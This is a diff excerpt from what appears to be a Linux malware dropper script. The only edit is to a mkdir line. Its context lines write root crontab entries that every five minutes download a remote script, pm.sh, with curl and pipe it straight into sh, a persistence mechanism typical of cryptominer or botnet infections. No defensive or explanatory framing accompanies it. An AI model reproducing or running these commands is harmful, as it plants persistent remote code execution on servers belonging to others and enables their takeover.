@@ -1,6 +1,6 @@
 export PATN=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
 echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh" > /var/spool/cron/root
-mkdir -p "/var/spool/cron/crontabs"
+mkdir -p /var/spool/cron/crontabs
 echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh" > /var/spool/cron/crontabs/root
 Doc2l()
 {
